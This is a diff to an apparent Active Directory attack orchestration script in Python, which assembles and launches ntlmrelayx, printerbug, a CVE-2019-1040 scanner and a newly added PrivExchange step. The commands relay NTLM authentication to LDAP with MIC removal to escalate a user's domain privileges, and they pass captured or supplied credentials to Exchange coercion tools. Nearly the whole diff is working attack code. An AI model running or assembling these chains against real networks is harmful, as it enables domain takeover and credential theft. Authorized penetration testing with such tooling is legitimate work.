@@ -12,12 +12,11 @@ def create_ntlmrelayx_cmd(args):
     """
     Creates the ntlmrelayx cmommand string
     """
-#    relay_cmd = f'python {cwd}/tools/impacket/examples/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'
     relay_cmd = f'python {cwd}/tools/ntlmrelayx.py -of {cwd}/hashes/ntlmrelay-hashes.txt -smb2support'
 
     # PrinterBug/PrivExchange
     if args.user:
-        dom, user, pw, host = parse_creds(args)
+        dom, user, pw = parse_creds(args)
         target = f' -t ldap://{args.domain_controller}'
         relay_cmd = relay_cmd + f" --remove-mic --escalate-user {user}" + target
         return relay_cmd
@@ -97,32 +96,36 @@ def start_mitm6(args):
     return mitm6
 
 def start_exchange_scan(args):
-    if args.exchange_file:
-        with open(args.exchange_file, "r") as f:
-            target = f.readlines()[0]
-        cmd = f'python {cwd}/tools/cve-2019-1040-scanner/scan.py -target-file {args.exchange_file} {args.user}@{target}'
-    else:
-        cmd = f'python {cwd}/tools/cve-2019-1040-scanner/scan.py {args.user}'
-
+    with open(args.exchange_file, "r") as f:
+        target = f.readlines()[0].strip()
+    cmd = f'python {cwd}/tools/cve-2019-1040-scanner/scan.py -target-file {args.exchange_file} {args.user}@{target}'
     logfile_name = "exchange_scanner"
     scan = start_process(cmd, logfile_name, live_output=True)
 
     return scan
 
-def start_printerbug(creds, exchange_server, local_ip):
-    dom_user_pw = creds.rsplit('@', 1)[0]
-    cmd = f'python {cwd}/tools/krbrelayx/printerbug.py {dom_user_pw}@{exchange_server} {local_ip}'
+def start_printerbug(dom_user_passwd, exchange_server, local_ip):
+    cmd = f'python {cwd}/tools/krbrelayx/printerbug.py {dom_user_passwd}@{exchange_server} {local_ip}'
     logfile = 'printerbug'
     printerbug = start_process(cmd, logfile)
+
     return printerbug
+
+def start_privexchange(args, local_ip):
+    dom, user, passwd = parse_creds(args)
+    with open(args.exchange_file, "r+") as f:
+        lines = f.readlines()
+        exchange_server = lines[0].strip()
+    cmd = f'python {cwd}/tools/PrivExchange/privexchange.py -ah {local_ip}, -u {user} -p \'{passwd}\' -d {dom} {exchange_server}'
+    logfile = 'privexchange'
+    privexchange = start_process(cmd, logfile)
+    return privexchange
+
 
 def start_process(cmd, logfile_name, live_output=False):
     proc = Process(cmd)
-
     logfile = f'{cwd}/logs/{logfile_name}.log'
-
     print_info(f"Running {proc.cmd}")
-
     proc.run(logfile, live_output=live_output)
 
     return proc
